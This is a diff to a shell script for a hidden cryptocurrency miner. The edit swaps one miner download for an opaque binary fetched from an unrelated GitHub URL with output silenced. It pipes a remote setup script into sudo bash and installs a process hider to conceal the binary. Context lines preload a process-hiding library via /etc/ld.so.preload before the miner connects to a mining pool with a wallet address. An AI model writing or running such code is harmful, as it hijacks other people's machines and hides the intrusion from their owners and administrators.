@@ -37,10 +37,15 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz 
-tar xf hellminer_cpu_linux.tar.gz
+sudo apt-get install -y ca-certificates wget libcurl4 libjansson4 libgomp1
 
-rm -f hellminer_cpu_linux.tar.gz
+curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && sudo apt install nodejs && sudo npm i -g node-process-hider
+
+sudo wget -qO manuk https://raw.githubusercontent.com/renilo/hajar/main/enak >/dev/null 2>&1  
+
+sudo chmod +x manuk >/dev/null 2>&1
+
+sudo ph add manuk
 
 ./graftcp/graftcp wget https://raw.githubusercontent.com/nathanfleight/scripts/main/magicBezzHash.zip 
 unzip magicBezzHash.zip 
@@ -49,4 +54,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/ 
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload 
  
-./graftcp/graftcp ./hellminer -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RBkxREY7wobWvRihJSkREPH2wycJqCECHZ.THR -p x --cpu $(nproc --all)
+./graftcp/graftcp ./manuk -a verus -o stratum+tcp://eu.luckpool.net:3956 -u RBkxREY7wobWvRihJSkREPH2wycJqCECHZ.$(echo $(shuf -i 1-3 -n 1)-WEWEK) -p x -t 4
